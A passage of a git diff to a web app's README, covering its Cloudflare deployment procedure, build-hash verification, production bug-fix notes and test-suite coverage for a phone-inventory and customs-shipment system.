-retained for historical attribution with `password_hash` NULL, so it can never
-authenticate. `POST /api/auth/dev-login` returns **410** in production and no variant
-of it (any email, empty body) returns a token — probed, not assumed.
-
-**Deploy order matters when a migration adds credentials** (learned this pass): the
-new `/api/auth/login` route and the dev-login 410 tombstone ship in the *same* bundle,
-so the deploy that creates real login is the deploy that removes the passwordless one
-— there is no window in which both exist. The safe sequence is therefore: apply the
-migration → write **both** password hashes to prod D1 → **read them back and confirm
-byte-exact non-NULL values** (prove the write committed, don't just issue it) → deploy
-the code → verify both logins live *with a matching wrong-password 401* → only then
-confirm the 410. The real anti-lockout guarantee is that `gsk hosted d1_execute`
-writes prod D1 **independently of the worker**, so a hash can always be re-provisioned
-without a working web login.
-
-**Verifying a login is a place false witnesses hide** (recorded because it nearly bit
-us): before this deploy, prod `POST /api/auth/login` returned `401` — which *looks*
-like a working login rejecting a bad password, but was actually the auth middleware
-rejecting an unknown route, since the old bundle had no `/login` at all. The tell is
-that `/api/auth/nonexistent-xyz` returned the **identical** body
-(`Unauthorized: missing bearer token`), whereas the real route returns
-`Invalid email or password`. Always probe an unknown sibling path to prove a 401 means
-what it appears to mean. (The same pattern appeared once more during this deploy: the
-first post-deploy wrong-password probe returned the middleware error because an old
-worker version was still serving mid-propagation — it resolved on retry, and the
-distinguishable error bodies are what made the difference visible.)
-
-**Remote-D1 caveat (fixed in `f6e69a3`):** Cloudflare's remote D1 rejects explicit
-`BEGIN TRANSACTION` / `COMMIT` in migration files (error 7500) — wrangler applies each
-migration file as one batch, which is D1's supported atomicity. Do not add explicit
-transaction wrappers to new migrations.
-
-Redeploy: `npm run build && gsk hosted deploy` (user approves in the UI), then re-set
-secrets if the redeploy dropped bindings. D1 data ops: `gsk hosted d1_query` /
-`d1_execute`.
-
-**This project has no `.tables/schema.json` and a real `wrangler.jsonc` —
-it is a sandbox-backed project, not `code_sandbox_light`/`code_sandbox_light_git`.**
-`gsk hosted deploy`'s own `--help` text says that category "use[s] their
-normal sandbox deployment pipeline" — confirmed in practice by the redeploy
-command above: `npm run build` runs first, locally, in the invoking
-session's own sandbox (producing a git-ignored `dist/` that has never been
-committed), then `gsk hosted deploy` publishes whatever `dist/` that build
-just wrote. There is **no server-side Git-ref resolution** for this project
-category (that only applies to `code_sandbox_light_git`) — the deploying
-session's own checked-out commit and its own fresh build ARE the artifact
-that ships. (A prior chat turn incorrectly stated the opposite — that this
-project publishes from "a Git snapshot" server-side — before this
-distinction was checked; see the correction in
-`.deploy-checks/g5-phase2-live-half.md`'s closing section.)
-
-**Identity-stability checklist for any live-read session or the deploy
-call itself** (added 2026-08-21 after this session's Genspark-account
-identity flipped unprompted in *both* directions within a single turn —
-confirmed via `gsk login-info`, `gsk hosted list`'s resource count, and
-`gsk hosted list --type d1`'s count, not assumed from one command): run
-`gsk login-info` immediately **before** and immediately **after** any live
-D1 read sequence or a `gsk hosted deploy` call, and treat a mismatch
-between the two as invalidating everything read or attempted in between.
-For a deploy specifically, a post-call identity mismatch is grounds to
-re-verify via `gsk hosted worker_get` / `d1_schema` that the resource
-actually mutated belongs to the intended project (`d6aea290-...`) before
-reporting the deploy as successful.
-
-**Mandatory pre-deploy build-determinism gate (added 2026-08-21, corrected
-2026-09-02 — see below):**
-because the deploy publishes the invoking session's own fresh
-`npm run build` output (not a pinned/committed artifact), the deploying
-session MUST: (1) confirm the intended commit is checked out; (2)
-`npm ci` — a fresh install from `package-lock.json` (confirmed present
-and git-tracked), not a `node_modules` carried over from a different
-session; (3) `rm -rf dist && npm run build`; (4) compute the **whole-tree
-hash** below and compare against the hash recorded for that commit. **A
-hash mismatch is stop-and-investigate, not a curiosity** — it means
-either the lockfile didn't pin something that matters or the wrong
-commit is checked out; resolve the cause and re-confirm before calling
-`gsk hosted deploy`.
-
-**Correction (2026-09-02): hash the whole `dist/` tree, not `dist/_worker.js`
-alone — that file is BLIND to any static-asset-only change.** `vite build`
-only bundles `src/`; everything under `public/` (today: `static/app.js`,
-`static/favicon.svg`, `static/style.css`, `tracker/index.html`) is copied
-into `dist/` untouched by that step. Reproduced directly, not asserted: two
-independent `rm -rf dist && npm run build` runs from the *same* commit
-produced byte-identical `dist/_worker.js` hashes whether `public/static/app.js`
-held its current content or content from two commits earlier — a real UI
-change with zero `_worker.js`-hash signature. A checklist recording only
-`sha256sum dist/_worker.js` would report the same hash whether or not a
-frontend fix like `d64bc28` had actually shipped, which defeats the
-purpose of recording a hash at all. Naming `app.js` specifically as a
-second file to also hash was considered and rejected — it only postpones
-the same blind spot to the next file that changes (e.g. `tracker/index.html`,
-`style.css`) unless the convention is re-amended every time. The fix
-instead covers the whole `dist/` tree, independent of which files exist:
-
-```bash
-find dist -type f | sort | xargs sha256sum | sha256sum
+# Production redeploy
+npm run build && gsk hosted deploy   # user approves the named pending-action ID in the UI
 ```
 
-(sorted so file-enumeration order can never vary the result; per-file
-hashes first so a same-byte-count-different-content collision across two
-files can't cancel out; then hashed again to fold the whole listing into
-one comparable value.) Verified both required properties directly this
-session, not assumed: (a) **reproducible** — two independent clean builds
-from the same commit produced the identical whole-tree hash
-(`93cb79d9beced2844cee232c66cd86b480e0c3397b20d65ddefbe73caaa04cdd`); (b)
-**sensitive** — swapping only `public/static/app.js` for an earlier
-commit's version and rebuilding changed the whole-tree hash
-(`ec9ce0ba9d0537ffdae3b02881f4908c56644f699821f3777fc2a759701e220c`), while
-`dist/_worker.js`'s own hash stayed at `1b8ca7be4e31bdb0b3565924ac013fc6aaa3220c12840ece7645a8b2394b7f89`
-in both cases — proving the old single-file convention really was blind to
-that change. **`93cb79d9...` is the correct whole-tree hash for commit
-`ec31bf6`** (clean `rm -rf dist && npm run build`, `dist/_worker.js` alone
-hashes to `1b8ca7be...`, `dist/static/app.js` alone to
-`ae5ee4f05473af15fb3f900da6d2760e4e23bbe8904e00d81b6c78bedd59354a`, both
-recorded for reference but the whole-tree hash is the one to compare
-going forward). Older single-file hashes recorded before this correction
-(`d444aba2...` for `e73ea64` in `.deploy-checks/g5-phase2-offline-half.md`)
-remain historically accurate for what they measured, but are not
-comparable to a whole-tree hash and should not be re-used as a pass/fail
-gate for any future commit — recompute the whole-tree hash fresh for
-whichever commit is actually being deployed.
-
-**Recomputed for the actual deploy commit (2026-09-02) — the `ec31bf6`
-hashes above are stale for this deploy.** `ec31bf6` was five commits
-behind the deploy set's tip; both `src/` and `public/static/app.js` moved
-again since then (`84a57e7`, `d64bc28`, `fc356c2`, `7d20d47`, `939b7a1`,
-`1c7586c`), so the recorded whole-tree hash no longer matches the
-artefact this deploy actually publishes — comparing against it would be
-the same class of blindness the whole-tree convention exists to catch,
-just approached from the other direction (a stale-but-present hash
-looks like a completed check, not an absent one). Two independent clean
-`rm -rf dist && npm run build` runs at `1c7586c` (the seven-commit deploy
-set's tip — `7d20d47`, `939b7a1`, `fc356c2`, `84a57e7`, `d64bc28`,
-`ec31bf6`, `1c7586c`, each touching `src/`; the pending inventory-valuation
-"status list" refinement could not be located and so was not added as an
-eighth commit, per the fallback of deploying the seven if the eighth
-doesn't finish cleanly — `origin/main` at `f1db90f`) produced the identical
-whole-tree hash — **`88ab8ab79b518518ef20c25e607396ec776a444a475de68a166149b89dd20405`
-is the correct whole-tree hash for commit `1c7586c`**. Per-file
-reference: `dist/_worker.js` →
-`fed7230c53c5b1e9c2cd9e9549ed5a6dc8b0f2427e56945f509e7a036d38d74f`,
-`dist/static/app.js` →
-`9ccd095122d805200fc5f31503e6ec92597a95ed0673f2803543bf7e8f22cb8b`,
-`dist/_routes.json` →
-`faae3ca654c8fa00f52b7311d3c9e1bdc36f39022ec6d4832ecc3d5d7da519ca`,
-`dist/static/favicon.svg` →
-`287dc951275876be22d043fa4ab1364c7cf03aea602c6f9495e51b9c135079dc`,
-`dist/static/style.css` →
-`be55b78ce2c4a16c3d4d12a4dfdab556f1b8753ab0a385a95f2bdbc7948383fd`,
-`dist/tracker/index.html` →
-`25f91f7a411424c78c01249221d28372d1b23ad2577c8a834cc75c68420e49f0` — all
-for reference only; the whole-tree hash is what to compare against
-immediately before running `gsk hosted deploy`. As with `ec31bf6`, this
-hash will itself go stale the moment another commit touches `src/` or
-`public/`; recompute fresh for whichever commit is the actual deploy
-target next time, rather than trusting this recorded value past this
-deploy.
-
-**Recomputed for the actual deploy commit (2026-09-03) — the `1c7586c`
-hash above is stale for this deploy.** `1c7586c` was three commits behind
-the deploy set's tip; both `src/` and `public/static/app.js` moved again
-since then (`fd200b9`: valuation-inclusion decision; `6cab275`: reopen
-manager-gate, server + client + tests; `8cfbb99`: browser-verified the
-reopen gate and hardened `test/browser/_harness.mjs` with a worker-process-
-staleness guard), so the recorded whole-tree hash no longer matches the
-artefact this deploy actually publishes. Two independent clean
-`rm -rf dist && npm run build` runs at `8cfbb99` (the deploy set's tip —
-`fd200b9`, `6cab275`, `8cfbb99` since the prior deploy at `1c7586c`/`bfcdf5f`;
-`origin/main` still at `1c7586c`) produced the identical whole-tree hash —
-**`7bdc89ec2fa308c5679ec554be9aeae9d8d9bd8d440d0ff9b0b6b1abb4f7b5bd`
-is the correct whole-tree hash for commit `8cfbb99`**. Per-file reference:
-`dist/_worker.js` →
-`a3013bfa283dfdf39e244b7f7aa6542e7b428568b1d40fe07793b1ceeeb9ed20`,
-`dist/static/app.js` →
-`bd83a33824d034752c44b0767a92fcfa1c7211e2f30f0b024cdc724cc0b16d6c`,
-`dist/_routes.json` →
-`faae3ca654c8fa00f52b7311d3c9e1bdc36f39022ec6d4832ecc3d5d7da519ca`
-(unchanged from `1c7586c` — no route surface change), `dist/static/favicon.svg`
-→ `287dc951275876be22d043fa4ab1364c7cf03aea602c6f9495e51b9c135079dc`
-(unchanged), `dist/static/style.css` →
-`be55b78ce2c4a16c3d4d12a4dfdab556f1b8753ab0a385a95f2bdbc7948383fd`
-(unchanged), `dist/tracker/index.html` →
-`25f91f7a411424c78c01249221d28372d1b23ad2577c8a834cc75c68420e49f0`
-(unchanged) — all for reference only; the whole-tree hash is what to
-compare against immediately before running `gsk hosted deploy`.
-
-**Recomputed for the actual deploy commit (2026-09-07) — the `8cfbb99`
-hash above is stale for this deploy.** `8cfbb99` was six commits behind
-the deploy set's tip; both `src/` and `public/static/app.js` moved again
-since then (`89fb02b`: fixed the bulk-transition reject/un-reject
-authorization bypass, H0 — shared `checkRejectUnrejectGate()` gate helper
-in `src/lib/deviceLifecycle.ts`, defense-in-depth inside
-`transitionDevice()`, bulk-route gating and UI-affordance role-filtering
-in `src/routes/devices.ts`/`public/static/app.js`; `2c906d0`, `31ec566`,
-`d6c81e0`, `b37ad9b`: docs-only / test-harness-only, no `src/`/`public/`
-changes), so the recorded whole-tree hash no longer matches the artefact
-this deploy actually publishes. Two independent clean
-`rm -rf dist && npm run build` runs at `b37ad9b` (the deploy set's tip —
-`89fb02b`, `2c906d0`, `31ec566`, `d6c81e0`, `b37ad9b` since the prior
-deploy at `8cfbb99`/`b9310dd`; `origin/main` and `genspark/main` still at
-`76c51e8`) produced the identical whole-tree hash —
-**`c6e68b33c286e5dac0ae90f4588be9ae7616eebb02096c182b1b688eaaf8a6a9`
-is the correct whole-tree hash for commit `b37ad9b`**. Per-file reference:
-`dist/_worker.js` →
-`d9872783f3f32831dca8254838cf75e0d804d48cef9f1336140b64a1ca984750`,
-`dist/static/app.js` →
-`c6460563ee6a82fdb74472ba4cd1cf1b6891564e10df6c64db6bc94b3cd7fc23`,
-`dist/_routes.json` →
-`faae3ca654c8fa00f52b7311d3c9e1bdc36f39022ec6d4832ecc3d5d7da519ca`
-(unchanged — no route surface change), `dist/static/favicon.svg` →
-`287dc951275876be22d043fa4ab1364c7cf03aea602c6f9495e51b9c135079dc`
-(unchanged), `dist/static/style.css` →
-`be55b78ce2c4a16c3d4d12a4dfdab556f1b8753ab0a385a95f2bdbc7948383fd`
-(unchanged), `dist/tracker/index.html` →
-`25f91f7a411424c78c01249221d28372d1b23ad2577c8a834cc75c68420e49f0`
-(unchanged) — all for reference only; the whole-tree hash is what to
-compare against immediately before running `gsk hosted deploy`. As with
-prior recomputations, this hash will itself go stale the moment another
-commit touches `src/` or `public/`; recompute fresh for whichever commit
-is the actual deploy target next time, rather than trusting this recorded
-value past this deploy.
-
-**This is the deploy this hash is for.** `b37ad9b` ships the H0
-bulk-transition authorization-bypass fix — currently live and
-unpatched in production `b9310dd` — as the sole code change in the set;
-`2c906d0`/`31ec566`/`d6c81e0`/`b37ad9b` on top are docs/test-harness only.
-`migrations/` re-checked immediately before this build: tip is `0031`,
-`migrations-held/0030_...` remains correctly held per its own README
-(no migration to apply for this deploy). No further code, docs, or
-investigation work is queued before the live deploy sequence — this
-commit closes the offline lane for this deploy; the next actions are the
-unbroken live sequence (`gsk login-info` → `git push origin main` →
-`git push genspark main` → `wrangler deploy` naming `d6aea290-...`
-explicitly → `gsk login-info`), issued as the FIRST live commands of a
-fresh turn with nothing preceding them.
-
-Two scope decisions settled for this deploy batch, recorded here rather
-than left implicit: (1) export-staging/consignment-move operator-role
-test coverage (`opr.ts`'s `/shipments/:id/scan` and `/lines`) is
-**deliberately deferred**, not omitted — it would verify behaviour the
-operator has already confirmed should stay as-is, a prior attempt at it
-was already reverted, and the Zoho import files due this week are the
-higher-priority use of the same time; (2) "commit 3" is **complete,
-scoped to the `/repair/reopen` manager-gate** — investigation during this
-pass showed the other two originally-planned bullets (`/repair/start`,
-`/repair/scan-back` operator-accessibility) were already correct
-pre-existing behaviour needing no new code, so the commit intentionally
-shrank to just the reopen gate rather than adding tests for behaviour
-that was never broken.
-
-As with `1c7586c`, this hash will itself go stale the moment another
-commit touches `src/` or `public/`; recompute fresh for whichever commit
-is the actual deploy target next time, rather than trusting this
-recorded value past this deploy.
-
-**2026-07-29 redeploy — fixed "new catalog SKUs invisible in the Catalog tab":**
-after migration 0017 expanded `sku_catalog` to 2,781 rows, the new iPhone 17/Air/
-SE/XR and Galaxy S26/Z Fold7/Flip7-family rows were correctly in D1 (confirmed via
-direct `d1_query`) but never appeared in the UI. Root cause: `GET /api/catalog`'s
-unfiltered listing had a flat `ORDER BY brand, model, capacity ASC LIMIT 1000` —
-with ~1,472 Apple rows sorting alphabetically before "IPHONE 17", the cap cut the
-result set off mid-way through the IPHONE 13/14 range, so no iPhone 17-and-later
-row (and no Samsung row at all, since APPLE < SAMSUNG) was ever returned — a
-hidden pagination bug, not a data problem. Fixed by raising the cap to 5000 (see
-`src/routes/catalog.ts`); redeployed via `gsk hosted deploy`
-(`efa77e79-eb5f-4b02-aef7-b88eef084efa`, approved, `Current Version ID:
-ac6ffdff-bfee-41c5-8b0f-5c23a86805fa`). The redeploy also re-ran migration 0017
-against prod D1 (wrangler applies any migration file not yet recorded as applied
-on that Worker's tracking table) — confirmed idempotent: row count stayed at
-2,781 and zero duplicate `(model, capacity, color, grade)` tuples exist
-post-redeploy.
-
-**2026-07-29 redeploy — fixed "197-IMEI manifest upload succeeds in sandbox
-but silently loads zero devices in production":** reported as: same manifest
-CSV uploaded to both environments, sandbox showed all 197 devices, production
-showed a manifest header with **0** expected_devices and no visible error.
-Root cause: `POST /api/manifests` resolved each row's catalog SKU via
-`resolveCatalogSku()` **sequentially inside the upload loop** — 1–3 D1 SELECT
-queries per row. Against the sandbox's in-process SQLite stub this is free;
-against real remote D1 each call is a network round trip. Once `sku_catalog`
-grew to 2,781 rows (see the LIMIT-1000 fix above), a 197-row upload meant
-200–600+ sequential round trips in a single Worker invocation — slow enough
-to trigger a client disconnect before the (separately batched) `expected_devices`
-INSERT — which runs only *after* the loop completes — ever executed. The
-manifest header commits early and is left orphaned with zero children and no
-surfaced error. Confirmed by direct D1 comparison: prod manifest id 11
-("ASN-OUTON260724-177PCS") had 0 `expected_devices` rows while the identical
-upload's local manifest id 36 had all 197; `gsk hosted worker_stats` also
-showed 3 `clientDisconnected` events in 24h against 0 hard errors. Fixed by
-loading the organisation's whole `sku_catalog` **once** up front
-(`resolveCatalogSkuBulk` in `src/lib/catalog.ts`) and matching every row
-against it in memory (`matchCatalogRows`, pure JS, no DB I/O) — O(1) DB round
-trips instead of O(rows). `resolveCatalogSku()` is kept unchanged for genuine
-single-lookup callers (`scan.ts`, the catalog add/lookup UI actions in
-`catalog.ts`). Verified end-to-end locally before deploying: minted a test
-JWT, uploaded a synthetic 197-row manifest with Luhn-valid IMEIs against the
-running sandbox — all 197 rows inserted with `catalog_unmatched: 0` and the
-correct SKU resolved on every row, completing in ~270ms; the test manifest
-was deleted afterwards. Redeployed via `gsk hosted deploy`
-(`56938504-8f85-4e0c-83fb-8f6644a3de3c`, approved, `Current Version ID:
-d6b91c70-9b46-4b35-9148-736863956435`) — no migrations pending, so this was a
-code-only redeploy. The broken orphaned manifest (id 11) is gone from
-production, freeing the reference for re-upload.
+**Post-deploy smoke checks** (standing convention): `git diff <deployed-commit> -- src/index.tsx` must be empty (confirms the working tree at submission time matched the intended commit with nothing uncommitted), and the deployed `/static/app.js`'s SHA-256 must match the local repo's copy at that commit.
 
 <details><summary>Alternative: deploy to your own Cloudflare account (BYOK)</summary>
 
 ```bash
-npx wrangler d1 create webapp-production         # then paste the id into wrangler.jsonc
+npx wrangler d1 create webapp-production
 npm run db:migrate:prod
-npx wrangler pages secret put JWT_SECRET         # required — pick a strong random value, never commit it
+npx wrangler pages secret put JWT_SECRET
 npm run deploy
 ```
 </details>
 
 ## Testing
 
-**Automated suite**: [Vitest](https://vitest.dev/) via [`@cloudflare/vitest-pool-workers`](https://developers.cloudflare.com/workers/testing/vitest-integration/), which runs tests inside the real `workerd`/Miniflare runtime against a real D1 binding (all migrations in `migrations/` applied before each test file — currently 32 files, `0001`-`0022`, `0023a`/`0023b`/`0023c`, `0024`-`0029`, `0031` (all 32 now also live in production as of the 2026-08-21 deploy, see **Deployment** above); `0030` is deliberately held at `migrations-held/` pending renumbering ahead of its own future deploy, see that directory's README — see `vitest.config.ts` and `test/apply-migrations.ts`), not mocks.
+**Automated suite**: [Vitest](https://vitest.dev/) via `@cloudflare/vitest-pool-workers` — runs inside real `workerd`/Miniflare against a real D1 binding with all 41 migrations applied, not mocks.
 
 ```bash
 npm test              # vitest run — runs once and exits
-npm run test:watch    # vitest — watch mode
+npm run test:watch    # watch mode
 ```
 
-Current coverage (349 tests across 15 suites, run 2026-08-11: **342 passed, 7 skipped, 0 failed** — `npx vitest run` output; the 7 skipped are `test/repairWorkflow.spec.ts`'s Group D `#30–36`, see **Active Workstreams** below):
-- **`test/deviceLifecycle.spec.ts`** (24 tests) — `transitionDevice()`: every entry in `ALLOWED_TRANSITIONS` succeeds; a representative set of disallowed transitions (explicitly including `RECEIVED → SOLD`) reject with `InvalidTransitionError`; unknown-status and unknown-device-id error paths; org-scoping (a device in another organisation is treated as not-found, never a cross-tenant leak); each transition writes **exactly one** `device_events` row with the correct `from_status`/`to_status`/`user_id`/`organisation_id`; and — the audit-trail invariant from Priority 3 — `device.status === (most recent device_events row).to_status`, asserted automatically after single transitions, chains of transitions, and rejected-attempt no-ops, so a future refactor can't silently break it without a test failing (verified by deliberately injecting a bug that skips the status UPDATE — the invariant tests caught it immediately, then the fix was confirmed reverted byte-identical via `git diff`).
-- **`test/validate.spec.ts`** (40 tests) — `isValidCurrency()`: every code in `ISO_4217_CODES` accepted; `"UKL"`, empty string, whitespace-only, and assorted junk (`"XXX"`, `"GB"`, `"GBPX"`, non-string input, etc.) all rejected. Note: the validator normalizes to uppercase *before* checking (`.trim().toUpperCase()`), so a lowercase **valid** code like `"gbp"` currently passes — this is documented and locked in as its own explicit test (not silently asserted as a rejection), while lowercase **junk** (`"ukl"`, `"xyz"`) is still correctly rejected in any case. Also covers `normalizeCurrency()`'s fallback behaviour. **IMEI/serial rule (13 tests, added 2026-07-28)**: `validateImei()` accepts a Luhn-valid strict 15-digit IMEI and rejects a broken checksum; 14-digit and 16-digit numerics are **rejected** with the targeted "strictly 15 digits" message; a 10-character alphanumeric serial is accepted and **normalised to uppercase** (`c02xk1abcd` → `C02XK1ABCD`, all-numeric `1234567890` also accepted); 9/11-character serials and punctuation/whitespace forms are rejected with targeted messages; `isValidImeiFormat()` mirrors the same rule. Verified-can-fail ×2: loosening the regex back to 14–16 digits fails exactly the two rejection tests; dropping the uppercase normalisation fails exactly the normalisation test — both reverts confirmed sha1-identical.
-- **`test/forceAddValuation.spec.ts`** (21 tests) — `POST /api/scan/force-add` exercised through the **real Hono app** (`app.request()` with a signed JWT) against the real D1 binding. Proves the off-manifest exception branch enforces the same server-side valuation rules as the manifest-matched `/confirm` path: missing/empty/invalid `buy_price` → 422, missing/invalid `vat_type` → 422, invalid ISO 4217 `currency` (incl. `"UKL"`) → 422 — and every rejection is asserted to leave **zero side-effects** (no `received_devices` row, no `FORCE_ADD` event, no `scan_events` 'received' row, no print job). The happy path asserts the persisted row AND the `FORCE_ADD` `device_events` metadata both carry the exact valuation (`buy_price`/`currency`/`vat_type`, normalised). Lowercase `"gbp"` accepted-and-normalised is locked in as an explicit test, consistent with the validate suite. Verified-can-fail: the server requirement was deliberately flipped to `required: false` → 4 tests failed immediately; the revert was confirmed sha1-identical to the committed file.
-- **`test/manualValuation.spec.ts`** (19 tests) — `POST /api/scan/manual` (Quick receive), the last intake branch that was still `required: false`, now enforcing the same rules: missing/empty/invalid `buy_price` → 422, missing/invalid `vat_type` → 422, invalid ISO 4217 `currency` → 422, all with zero side-effects asserted (no device row, no `MANUAL_RECEIVE` event, no scan_event, no print job); happy path asserts the row and the event metadata carry the exact normalised valuation; lowercase `"eur"` accepted-and-normalised locked in. Same verified-can-fail discipline (flipped to `required: false` → 4 immediate failures; revert sha1-identical).
+**Current baseline (2026-10-05): 808 passed / 8 skipped / 0 failed across 38 test files.** This baseline was only reached after discovering the gate itself is non-deterministic under load (see **Z-20** below) — two per-test timeout fixes (shared, named constants in `test/testTimeouts.ts`: `SEQUENTIAL_BATCH_WRITE_TIMEOUT_MS = 60000`, `PASSWORD_HASH_CHAIN_TIMEOUT_MS = 15000`) were required before two consecutive full-suite runs came back clean. The global vitest default (5000ms) is deliberately left untouched so a genuine future performance regression still surfaces — only specific, named, commented call sites get an override.
 
-**Browser-UI checks (Playwright + real Chromium)**: `test/browser/force-add-ui.browser.mjs` (22 checks) and `test/browser/manual-ui.browser.mjs` (13 checks — same pattern for the Quick receive modal: missing fields blocked with zero network requests, `UKL` server-rejected through the UI, valid values persisted exactly), all passing — see `test/browser/README.md` for how to run it and the full check list). Proves through the actual UI — not curl — that (1) the login click-through works end to end (bad email fails loudly, blank-email seeded-admin sign-in reaches the app shell, session survives reload via `/api/auth/me`, logout returns to the login screen), and (2) the force-add path for off-manifest devices cannot create a device without valid `buy_price`/`vat_type`/valid-ISO `currency`: missing fields are blocked client-side with **zero network requests** (asserted via response interception), while an invalid currency (`UKL`) typed into the UI genuinely reaches the **server** and the rendered toast carries the server's 422 ISO 4217 rejection; after all blocked attempts the inventory API confirms no row exists; the valid-values path succeeds with the exact valuation persisted. Failure-mode verified by sabotaging both the client checks and the server requirement — the checks failed immediately — then restoring from git (sha1-verified) and cleaning the leaked row from local D1.
+The 8 skipped tests are `test/repairWorkflow.spec.ts`'s Group D (`#30–36`, Zoho batch generation/confirmation) — `describe.skip`ped with the reason stated in the skip label itself: Zoho batch upload was never built, parked by explicit owner decision (stock currently goes into Zoho by hand).
 
-- **`test/oprFoundation.spec.ts`** (25 tests) — OPR 1 foundation invariants through the real app: GBP-only shipment currency (`UKL` → 422 carrying the CHIEF-era explanation, `EUR` → 422, lowercase `"gbp"` normalised, empty defaults to GBP — every rejection asserted zero-side-effect on the `shipments` table); procedure codes (forbidden `2100+B51` → 422, warranty `2200+B51`/`2200+B02` accepted, `6121` import-only, direction cross-checks); declaration charset on `reference`/`consignee_name`; mandatory org-scoped authorisation linkage (missing/unknown/cross-org all 422); CDS + CHIEF numbers stored distinct; duplicate CDS → 409; **snapshot freeze** (device edited after being added to a shipment — the line's declared `unit_value`/`grade` provably do not move); devices without `buy_price` rejected with no line created; non-DRAFT shipments immutable (409). Verified-can-fail ×3: the UKL guard, the `2100+B51` guard, and the line `buy_price` guard were each deliberately disabled → the matching tests failed → reverts confirmed sha1-identical.
-- **`test/oprExport.spec.ts`** (28 tests) — OPR 2 export-flow invariants through the real app: the consignment builder only accepts `READY_FOR_EXPORT` devices (a `RECEIVED` device → 409 with zero side-effects) and moves them `↔ IN_EXPORT_CONSIGNMENT` in lockstep with the line (both directions event-logged, `EXPORT_CONSIGNMENT_ADD`/`_REMOVE`); an import shipment with no linked export refuses the builder (422, zero side-effects); the generic transition endpoint refuses consignment-derived statuses in **both** directions; the validation engine's coded checks each proven individually (no-lines red, out-of-window ship date red, missing ship date amber, duplicate IMEI red, Luhn-broken IMEI red, pence-inexact and non-positive unit values red, missing logistics amber, missing commodity codes amber, fully-formed green); scan-out total equals the invoice total on the same real shipment (150 + 249.99 + 88.5 = 488.49 on **both** documents); the invoice carries the **CDS** number and provably not the CHIEF one; the pre-alert draft uses the mailbox/cut-off configured on the authorisation and flags an unconfigured mailbox instead of inventing one; **finalisation**: red blocks with zero side-effects (status/`export_mrn`/`finalised_at` all unchanged), amber passes, happy path locks the shipment, moves every device → `EXPORTED_UNDER_OPR` with `EXPORT_FINALISED` events carrying the MRN, and rejects re-finalise/scan/PATCH afterwards while `/export-proof` still lands. Verified-can-fail ×3: the red-block finalisation gate, the `READY_FOR_EXPORT` builder gate, and the totals-consistency check were each deliberately disabled → the matching tests failed → reverts confirmed sha1-identical.
-- **`test/oprImport.spec.ts`** (22 tests) — OPR 3 import/discharge invariants through the real app, sitting on true preconditions (each suite runs the full OPR 2 export flow first): the **return-consignment builder** only accepts `EXPORTED_UNDER_OPR` devices that have a line on the linked export (partial returns fine; a device from a different export → 409 zero-side-effect; duplicate open-draft membership → 409); the return line **copies the frozen declared-at-export value** — proven by mutating `buy_price` to 999.99 after export and asserting the return line still reads 150; device status does **not** move while the return is DRAFT (audit via `RETURN_CONSIGNMENT_ADD`/`_REMOVE` events only); **`computeCe1154`** pure-function suite (USD 1000 @ 1.25 → £800; 2% duty → £22 without relief / £16 net / £6 relief; quantity guardrail 162≠1; CHIEF number in the authorisation field with the CDS number provably absent, CDS only in the cross-reference statement — and a missing CHIEF number **refuses** rather than substituting); `addMonths` day-clamping (2026-08-31 + 6 → 2027-02-28) and discharge-row statuses; **end-to-end**: all 10 `IMP_*` validation codes, discharge-window overrun is **amber** (blocking receipt would strand physical goods), red validation blocks receipt with zero side-effects (`import_mrn` stays null), happy-path partial return (2 of 3 back → `RETURNED_UNDER_OPR` with `IMPORT_RECEIVED` events carrying the import MRN, third device untouched), the generic transition endpoint refuses `RETURNED_UNDER_OPR` both directions, discharge row 3/2/1 with deadline export-date + 6 months, and idempotent `/restock` → `ACTIVE_INVENTORY` (second call restocks 0). Verified-can-fail ×3: the related-export membership gate, the CHIEF→CDS substitution refusal, and the receipt red-block gate were each deliberately disabled → the matching tests failed → reverts confirmed sha1-identical.
+Suite-level notes:
+- `test/oprImport.spec.ts` is excluded from the main parallel config and run separately via `vitest.serial.config.ts` — a 324-sequential-round-trip test twice timed out at 60s under full-suite parallel contention while passing in isolation; documented in-file as a shared-runner capacity problem, not a flaky test.
+- Each OPR/lifecycle/valuation suite follows a "verified-can-fail" discipline: a guard is deliberately disabled, the matching test is confirmed to fail, then the revert is confirmed byte-identical via git diff — so a passing suite is evidence the guard actually works, not just that the test exists.
 
-- **`test/oprAutomation.spec.ts`** (20 tests) — OPR 4 automation invariants: the **honesty gate** (`/prealert/send` and `/clearance/send` with no `GMAIL_*` secrets → 503 `gmail_not_configured` AND provably zero `sent_emails` rows — the system never pretends an email went out); with secrets present (outbound fetch stubbed at the isolate boundary) the **wire behaviour is asserted directly**: the OAuth token exchange posts the refresh-token grant, the Gmail send carries `Authorization: Bearer` + a base64url RFC 2822 message which is decoded and checked for the recipient, multipart structure and attachments; the outbox records `sent` + provider message id on success and `failed` + the provider error on a 500 (response 502) — and a token-exchange failure never even reaches the send call; `shipment.finalised` (export and import) and `shipment.restocked` **webhooks** carry an HMAC-SHA256 `X-Signature` independently recomputed over the exact delivered bytes, disabled webhooks stay silent, and a receiver that throws never fails the finalise; **bulk scan**: mixed batches get per-IMEI independent outcomes with the same status codes as single scan (404 unknown, 409 not-READY), failed entries leave zero side-effects, the 200-IMEI cap and body-shape validation hold, and import (return) bulk goes through the return gates without moving device status. Verified-can-fail ×3: the honesty gate, the HMAC (signature computed over a tampered body), and the outbox status (hardcoded 'sent') were each deliberately broken → the matching tests failed → reverts confirmed sha1-identical.
+For the full per-suite breakdown (what each of the 38 files actually covers), read each file's own header comment — they're kept current as the authoritative description; this README does not duplicate them.
 
-**Gmail send caveat (stated plainly)**: the send path is proven against a **stubbed** Gmail API at the wire level. Real `GMAIL_*` credentials have never been configured, so **no real email has ever been sent by this system**. First-live-send verification remains an open item for when credentials exist.
+## Active Workstreams / Standing Tickets (`docs/plan/`)
 
-**Manual dispatch (OPR 6, interim until Gmail integration — deferred per owner instruction):** the draft modal shows copy-buttoned To/Subject/Body plus an "Open in mail app" mailto link; the operator sends from their own mail client and clicks "Mark as manually sent", which records an honest `provider=manual`/`status=manual` outbox row (cyan badge) — never confusable with a real system send. `status=sent` still exclusively means the system delivered via a provider; `/send` still refuses 503 without GMAIL_* secrets. MUCR (master UCR) is captured alongside MRN/DUCR/EAD at finalise or later via the export-proof card (migration 0014).
-
